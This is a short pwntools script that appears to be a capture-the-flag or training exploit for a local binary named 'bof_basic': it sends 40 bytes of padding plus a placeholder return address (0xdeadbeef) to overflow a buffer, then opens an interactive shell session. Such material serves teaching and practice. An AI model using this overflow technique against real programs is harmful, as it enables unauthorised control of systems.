from pwn import *

p = process("./bof_basic")

sh = 0xdeadbeef

payload = ''
payload += "A"*40
payload += p32(sh)

p.sendline(payload)
p.interactive()
